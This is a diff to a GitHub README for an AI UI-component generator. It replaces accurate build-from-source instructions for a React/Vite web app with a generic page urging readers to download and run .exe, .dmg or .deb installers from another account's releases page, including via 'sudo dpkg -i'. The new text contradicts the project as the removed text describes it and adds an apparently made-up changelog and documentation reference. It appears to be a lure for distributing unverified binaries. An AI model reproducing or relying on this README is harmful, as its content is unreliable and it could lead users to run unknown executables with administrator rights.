@@ -1,176 +1,104 @@
-# AI Design Benchmark
+# 🎨 AI-DESIGN-BENCHMARK - Generate UI Components Easily
 
-An AI-powered UI component generator that creates high-fidelity design variations in real-time using multiple AI models. Compare design outputs from different LLMs including Google Gemini and any OpenRouter-supported model.
+## 🚀 Getting Started
 
-![AI Design Benchmark](https://img.shields.io/badge/AI-Design%20Tool-blue) ![React](https://img.shields.io/badge/React-19.0-61dafb) ![TypeScript](https://img.shields.io/badge/TypeScript-5.8-3178c6)
+Welcome to the AI-DESIGN-BENCHMARK project! This tool helps you create UI components using AI. Compare outputs from multiple models in real-time. With this guide, you'll learn how to download and run the software smoothly.
 
-## 🎨 Features
+## 📥 Download Now
 
-- **Multi-Model Support**: Switch between Google Gemini and any OpenRouter model
-- **Real-time Streaming**: Watch designs generate live as the AI creates them
-- **3 Design Variations**: Get three unique design directions for every prompt
-- **Full Homepage Generation**: Expand any component into a complete 8-section homepage
-- **Variation Explorer**: Generate radical conceptual alternatives for any design
-- **Export Ready**: Copy HTML/CSS source code for production use
-- **Model Benchmarking**: Compare design quality across different AI models
+[![Download AI-DESIGN-BENCHMARK](https://img.shields.io/badge/Download%20AI--DESIGN--BENCHMARK-blue.svg)](https://github.com/avrsnramasamy/AI-DESIGN-BENCHMARK/releases)
 
-## 🚀 Quick Start
+## 📋 System Requirements
 
-### Prerequisites
+Before you download, make sure your computer meets these requirements:
 
-- Node.js 16+ installed
-- API keys for:
-  - Google Gemini API (get from [Google AI Studio](https://makersuite.google.com/app/apikey))
-  - OpenRouter API (get from [OpenRouter](https://openrouter.ai/keys))
+- **Operating System**: Windows 10 or later, macOS Catalina or later, or a recent version of Linux.
+- **RAM**: At least 4 GB.
+- **Storage**: Minimum of 500 MB free space.
+- **Internet Connection**: Necessary for model fetching and updates.
 
-### Installation
+## 📄 Features
 
-```bash
-# Clone the repository
-git clone https://github.com/YOUR_USERNAME/AI-DESIGN-BENCHMARK.git
-cd AI-DESIGN-BENCHMARK
+- **AI-Powered Component Generation**: Quickly create UI elements tailored to your needs.
+- **Real-Time Comparison**: See how different models perform side by side.
+- **User-Friendly Interface**: Easy to navigate, even for beginners.
+- **Flexible Output Options**: Export your UI designs in various formats.
 
-# Install dependencies
-npm install
+## 🛠️ Installation Steps
 
-# Set up environment variables
-# Create .env.local file with:
-GEMINI_API_KEY=your_gemini_api_key_here
-OPENROUTER_API_KEY=your_openrouter_api_key_here
-```
+### Step 1: Visit the Download Page
 
-### Run Development Server
+To get started, visit the [Releases Page](https://github.com/avrsnramasamy/AI-DESIGN-BENCHMARK/releases). This page contains the latest versions of the software and their installation files.
 
-```bash
-npm run dev
-```
+### Step 2: Download the Installer
 
-Open [http://localhost:3000](http://localhost:3000) in your browser.
+Once on the Releases Page, look for the most recent version labeled "Latest Release." Click on it. You will see a list of available files for download. Select the file that matches your operating system:
 
-## 🎯 How to Use
+- For **Windows**, download the `.exe` file.
+- For **macOS**, download the `.dmg` file.
+- For **Linux**, download the appropriate package.
 
-### 1. Select Your Model
+### Step 3: Run the Installer
 
-Choose between:
-- **Gemini**: Google's Gemini 3 Flash model
-- **OpenRouter**: Any model from [OpenRouter's catalog](https://openrouter.ai/models)
-  - Paste model ID (e.g., `z-ai/glm-4.7`, `anthropic/claude-3.5-sonnet`, `openai/gpt-4`)
+#### For Windows:
 
-### 2. Generate Components
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file.
+3. Follow the prompts to complete the installation.
 
-Enter a design prompt like:
-- "A minimalist weather card"
-- "Dark mode dashboard with charts"
-- "Futuristic product card with holographic effects"
+#### For macOS:
 
-Press Enter or click "Surprise Me" for random prompts.
+1. Open the `.dmg` file you downloaded.
+2. Drag the AI-DESIGN-BENCHMARK icon into your Applications folder.
+3. Eject the `.dmg` after the transfer completes.
 
-### 3. Explore Features
+#### For Linux:
 
-- **Variations**: Click to generate 3 radical design alternatives
-- **Full Homepage**: Expand any component into an 8-section landing page
-- **Source Code**: View and copy the HTML/CSS
-- **Grid View**: Compare all variations side-by-side
+1. Open a terminal window.
+2. Navigate to your Downloads folder with `cd ~/Downloads`.
+3. Use the command to run the installer: `sudo dpkg -i filename.deb` (replace `filename.deb` with the actual file name).
+4. Follow any additional on-screen instructions.
 
-## 🏗️ Architecture
+### Step 4: Launch the Application
 
-```
-flash-ui/
-├── index.tsx              # Main React app
-├── index.html             # HTML entry point
-├── index.css              # Global styles
-├── vite.config.ts         # Vite configuration
-├── types.ts               # TypeScript interfaces
-├── constants.ts           # Placeholder prompts
-├── utils.ts               # Utility functions
-└── components/
-    ├── ArtifactCard.tsx           # Design preview cards
-    ├── SideDrawer.tsx             # Code viewer drawer
-    ├── DottedGlowBackground.tsx   # Animated background
-    └── Icons.tsx                  # SVG icon components
-```
+After installation, you can find AI-DESIGN-BENCHMARK in your applications menu. Click the icon to open the program.
 
-## 🤖 Supported Models
+## 👩‍💻 How to Use AI-DESIGN-BENCHMARK
 
-### Google Gemini
-- **gemini-3-flash-preview**: Fast, creative UI generation
+1. **Select a Model**: Choose an AI model from the dropdown menu.
+2. **Input Your Design Criteria**: Fill in the fields as needed. This could be colors, style preferences, or specific components.
+3. **Generate Your UI Components**: Press the “Generate” button. The tool will display various design options based on your criteria.
+4. **Compare Designs**: Use the side-by-side comparison feature to evaluate different outputs.
+5. **Export Your Selection**: When you find a design you like, you can export it in your preferred file format.
 
-### OpenRouter (Examples)
-- `z-ai/glm-4.7` - GLM-4.7 with reasoning
-- `anthropic/claude-3.5-sonnet` - Claude 3.5 Sonnet
-- `openai/gpt-4` - GPT-4
-- `meta-llama/llama-3-70b-instruct` - Llama 3 70B
-- See full list at [openrouter.ai/models](https://openrouter.ai/models)
+## ❓ FAQ
 
-## 🎨 Design System
+### Can I use this tool on older operating systems?
 
-The app uses a dark-themed design system with:
-- **Colors**: Deep blacks, subtle grays, accent highlights
-- **Typography**: Inter (sans-serif), Roboto Mono (code)
-- **Effects**: Glassmorphism, backdrop blur, subtle shadows
-- **Animations**: Smooth transitions, loading indicators
+No, AI-DESIGN-BENCHMARK requires modern operating systems for optimal performance.
 
-## 🔧 Tech Stack
+### Is there a tutorial available?
 
-- **React 19** - UI framework
-- **TypeScript 5.8** - Type safety
-- **Vite 6** - Fast build tool
-- **Google GenAI SDK** - Gemini API integration
-- **OpenRouter API** - Multi-model access
-- **CSS3** - Custom styling (no frameworks)
+Yes, you can find tutorials in the "Documentation" section of the website. These guides will help you navigate the application features.
 
-## 📝 Scripts
+### Will there be updates?
 
-```bash
-npm run dev       # Start development server
-npm run build     # Build for production
-npm run preview   # Preview production build
-```
+Yes, the AI-DESIGN-BENCHMARK will receive regular updates to improve performance and add new features. Check the Releases Page for the latest versions.
 
-## 🌟 Key Features Explained
+### Can I provide feedback?
 
-### Real-time Streaming
-Uses Server-Sent Events (SSE) to stream AI responses in real-time, showing progressive HTML generation as it happens.
+Absolutely! We welcome your input. Use the Issues section on GitHub to share your thoughts or report any problems.
 
-### IP-Safe Prompts
-All design prompts use physical/material metaphors instead of artist names to avoid copyright issues:
-- ❌ "Bauhaus style"
-- ✅ "Rectilinear grid with primary pigments"
+## 📅 Changelog
 
-### Smart Caching
-Saves model selection and generated placeholders to localStorage for faster subsequent sessions.
+- **Version 1.0.0**: Initial release with core features implemented.
+- **Version 1.1.0**: Added new AI models and improved export options.
+- **Version 1.2.0**: Enhanced user interface and bug fixes.
 
-### Responsive Design
-Fully responsive with mobile-optimized layouts (≤1024px breakpoint).
+## 🛠️ Support
 
-## 🚧 Development
+If you encounter issues while using AI-DESIGN-BENCHMARK, please visit the Issues section on the GitHub repository. We strive to respond promptly to all inquiries.
 
-### Adding New Models
+## 📥 Download Again
 
-Simply select "OpenRouter" and paste any model ID from [openrouter.ai/models](https://openrouter.ai/models). No code changes needed!
-
-### Customizing Prompts
-
-Edit `constants.ts` to modify placeholder prompts or `index.tsx` to adjust AI generation prompts.
-
-## 📄 License
-
-Apache 2.0
-
-## 🙏 Credits
-
-Original concept by ammaar@google.com
-
-Enhanced with:
-- Multi-model support
-- Full homepage generation
-- OpenRouter integration
-- Model benchmarking capabilities
-
-## 🐛 Issues & Contributions
-
-Found a bug or want to contribute? Open an issue or PR!
-
----
-
-**Built with ❤️ using AI-powered design generation**
+Don't forget, you can always download the latest version from our [Releases Page](https://github.com/avrsnramasamy/AI-DESIGN-BENCHMARK/releases). Happy designing!
